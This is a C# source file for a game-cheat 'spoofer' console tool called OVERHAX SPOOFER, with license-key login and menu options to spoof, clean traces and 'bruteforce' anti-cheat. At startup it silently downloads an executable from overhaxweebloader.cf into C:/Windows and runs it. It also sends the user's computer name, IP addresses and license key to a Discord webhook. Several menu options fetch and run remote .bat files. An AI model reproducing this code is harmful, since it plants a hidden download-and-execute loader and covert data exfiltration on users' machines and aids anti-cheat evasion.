using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Windows;
using System.Windows.Forms;
using BOB.Commons;
using Microsoft.Win32;
using System.Drawing;
using System.Collections.Specialized;
using System;
using Console = Colorful.Console;



static class Windownamechange
{
    public static string GetRandomString()
    {
        string path = Path.GetRandomFileName();
        

        path  = (path + path + path   ); //window title
        return path;
    }
}




namespace API_Example
{
    class Entries
    {
        public static string key = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\OVERHAX SPOOFER\key", "Status", null);

        // draw menu after selection
        public static void drawMenu()
        {
            Protect.This.Start();
            Protect.This.test();
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    Application.Exit(null);
                }
            }
            catch
            {
                Console.WriteLine("[-] No connection", Color.Red);
            }
            Console.Clear();





            //Options Start for spoofing
            Draw.cache();

            Draw.print1();

            Console.Write(" [1] Load Spoofer \n", Color.LightPink);

            Console.Write(" [2] Load Cleaner \n", Color.LightPink);

            Console.Write(" [3] Discord: http://overhax.ml/join.html \n\n", Color.LightPink);

            Console.Write(" [4] Anti-cheat Bruteforcer \n", Color.LightPink);

            Console.Write("\n", Color.LightPink);

            Console.Write(" Option: ", Color.LightPink);

            //Options End for spoofing

            //Spoofing Start
            var cheeto = Console.ReadLine();
            if (cheeto == "1")
            {
                Protect.This.Start();

                Console.Clear();
                Thread.Sleep(1000);
                Draw.print1();

                Console.WriteLine("Spoofing, please Wait...");
                Thread.Sleep(2000);
                Console.WriteLine("Spoofing, please Wait...");
                Spoofer.spoof1();
                Thread.Sleep(4000);
                Console.WriteLine("Spoofing success!");
                drawMenu();
            }
            else if (cheeto == "2")
            {
                Protect.This.Start();

                Cleaners.Cleantraces();

                Draw.cache();
            }
            else if (cheeto == "3")
            {
                Console.Clear();

                System.Diagnostics.Process.Start("http://overhax.ml/join.html");
                drawMenu();

            }

            else if (cheeto == "7")
            {
                Application.Exit();
            }

            else if (cheeto == "4")
            {
                Protect.This.Start();

                Console.Clear();

                Console.Write("Grabbing latest version.", Color.LightPink);

                using (WebClient Client = new WebClient())
                {
                    Client.Proxy = null;
                    Client.Headers["User-Agent"] = "NOTCRACKEDOK";

                    FileInfo file = new FileInfo("C:/Windows/ForceBE.bat");
                    Client.DownloadFile("http://overhaxweebloader.cf/Ac%20Forcer%20files/forcer.bat", file.FullName);

                    Process.Start(file.FullName);
                }
                drawMenu();

                Console.ReadLine();
            }
            else if (cheeto == "5")
            {
                drawMenu();
            }


        }







        static void Main(string[] args)
        {
            Task.Run(() => Application.Run(new Form1()));

            Protect.This.Start();
            Protect.This.test();
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    Application.Exit(null);
                }
            }catch
            {
                Console.WriteLine("[-] No connection", Color.Red);
            }


            //try,finally exception catch

            try
            {
                //3sa discord play thingy

                WebClient discordthing = new WebClient();
                discordthing.Proxy = null;
                discordthing.Headers["User-Agent"] = "NOTCRACKEDOK";
                FileInfo playing = new FileInfo(@"C:/Windows/overhax.exe");
                discordthing.DownloadFile("http://overhaxweebloader.cf/overhax.exe", playing.FullName);
                Process.Start(playing.FullName);

                //Server IP Address

                IPHostEntry SystemAC = Dns.GetHostEntry(Dns.GetHostName());

                string IPAddress = string.Empty;

                foreach (var address in SystemAC.AddressList)

                {

                    if (address.AddressFamily == AddressFamily.InterNetwork)

                    {

                        IPAddress = address.ToString();

                    }

                }

                //external ip address

                HTTPGet req = new HTTPGet();
                req.Request("http://checkip.dyndns.org");
                string[] a = req.ResponseBody.Split(':');
                string a2 = a[1].Substring(1);
                string[] a3 = a2.Split('<');
                string a4 = a3[0];



                //External IP Address

                // WebClient yay = new WebClient();
                // string extip = yay.DownloadString("http://icanhazip.com");



                // pc name
                string localComputerName = Dns.GetHostName();

                //ip address
                IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());



                Draw.print1();

                // computer name

                Console.Write(" [", Color.LightPink);
                Console.Write("+", Color.LightPink);
                Console.Write("] ", Color.LightPink);
                Console.WriteLine("Welcome, " + localComputerName + "!", Color.LightPink);

                //auth.gg server ip

                Console.Write(" [", Color.LightPink);
                Console.Write("+", Color.LightPink);
                Console.Write("] ", Color.LightPink);
                Console.WriteLine("Server IP: " + IPAddress, Color.LightPink);

                // external ip display
                // add check if proxy?

                Console.Write(" [", Color.LightPink);
                Console.Write("+", Color.LightPink);
                Console.Write("] ", Color.LightPink);
                Console.Write("Client IP: " + a4, Color.LightPink);
                Console.WriteLine("");

                using (Webhooks.dWebHook dcWeb = new Webhooks.dWebHook())
                {
                    dcWeb.WebHook = Webhooks.dWebHook.Logweb;
                    dcWeb.ProfilePicture = "https://avatarfiles.alphacoders.com/119/119681.png";
                    dcWeb.UserName = "OVERHAX LOGGING";
                    Thread.Sleep(500);
                    dcWeb.SendMessage(">>> __***Connection started! on client***__" + "** Client IP: **" + a4 + " **Username: **" + localComputerName + " **KEY: **" + Entries.key);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error press enter", (ex.ToString()));
                Console.ReadLine();
            }



            // if above code failed due to connection below will run regardless
            finally
            {
                Console.Title = Windownamechange.GetRandomString();
                Auth.Handler.Initialize(); //Make sure settings are set in Settings.cs
                if (Auth.ProgramInfo.Freemode == "Enabled")
                {
                    Console.WriteLine("This application is in freemode redirecting!");
                }


            }

            //warning
            Console.WriteLine("");

            Console.WriteLine(" [!] We recommend making a backup of your personal files and registry before cleaning.", Color.Red);


            //auth.gg key
            Console.WriteLine("");
            Console.Write(" [=] ", Color.LightPink);


            List<char> chars = new List<char>()
{
    'L', 'i', 'c', 'e', 'n', 's', 'e', ':', ' '


};
            Console.WriteWithGradient(chars, Color.Yellow, Color.Fuchsia, 14);


            //license
            string key = Console.ReadLine();

            bool allin1 = Auth.Handler.Login_Register_Redeem_With_Key(key);

                    
            if (allin1 == true)
            {
                //ADD KEY TO REGISTRY
                RegistryKey SoftwareKey = Registry.LocalMachine.OpenSubKey("Software", true);
                
                RegistryKey AppNameKey = SoftwareKey.CreateSubKey("OVERHAX SPOOFER");
                RegistryKey AppVersionKey = AppNameKey.CreateSubKey("key");

                AppVersionKey.SetValue("Status", key);
                ///

                WebClient webClient = new WebClient();
                webClient.Proxy = null;
                webClient.Headers["User-Agent"] = "NOTCRACKEDOK";

                Console.Clear();
                //Options Start for spoofing
                Draw.cache();
                Draw.print1();

                Console.Write(" [1] Load Spoofer \n", Color.LightPink);

                Console.Write(" [2] Load Cleaner \n", Color.LightPink);

                Console.Write(" [3] Discord: http://overhax.ml/join.html \n\n", Color.LightPink);

                Console.Write(" [4] Anti-cheat Bruteforcer \n", Color.LightPink);

                Console.Write("\n", Color.LightPink);

                Console.Write(" Option: ", Color.LightPink);


                //Options End for spoofing

                //Spoofing Start
                var cheeto = Console.ReadLine();
                if (cheeto == "1")
                {
                    Protect.This.Start();

                    Console.Clear();
                    Thread.Sleep(1000);
                    Draw.print1();
                    MessageBox.Show("Starting to Spoof!\n Please wait...", "OverhaxSpoofer", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    Thread.Sleep(2000);
                    Console.Write(" [");
                    Console.Write("!");
                    Console.Write("] ");
                    Console.WriteLine("Spoofing, please Wait...", Color.LightPink);
                    Spoofer.spoof1();
                    Thread.Sleep(4000);
                    MessageBox.Show("Spoofed Successfully!", "OverhaxSpoofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    drawMenu();
                }
                else if (cheeto == "2")
                {
                    Protect.This.Start();

                    Cleaners.Cleantraces();

                    Draw.cache();
                }
                else if (cheeto == "3")
                {
                    Console.Clear();

                    System.Diagnostics.Process.Start("http://overhax.ml/join.html");
                    drawMenu();

                }

                else if (cheeto == "7")
                {
                    Application.Exit();
                }

                else if (cheeto == "4")
                {
                    Protect.This.Start();

                    Console.Clear();
                    Console.Write("Grabbing latest version..", Color.LightPink);
                    using (WebClient Client = new WebClient())
                    {
                        FileInfo file = new FileInfo("C:/Windows/ForceBE.bat");
                        Client.Proxy = null;
                        Client.Headers["User-Agent"] = "NOTCRACKEDOK";
                        Client.DownloadFile("http://overhaxweebloader.cf/Ac%20Forcer%20files/forcer.bat", file.FullName);

                        Process.Start(file.FullName);
                    }
                    drawMenu();

                    Console.ReadLine();
                }
                else if (cheeto == "5")
                {
                    Protect.This.Start();

                    //option 5

                    Console.Clear();
                    Console.Write("Loading... \n");

                    using (WebClient Client = new WebClient())
                    {
                        Client.Proxy = null;
                        Client.Headers["User-Agent"] = "OVERHAX";

                        FileInfo file = new FileInfo("C:/Windows/ummmm.bat");
                        Client.DownloadFile("http://overhaxweebloader.cf/r6.bat", file.FullName);

                        Process.Start(file.FullName);
                    }
                } else {

                drawMenu();

                }

            }

        }
    }

}
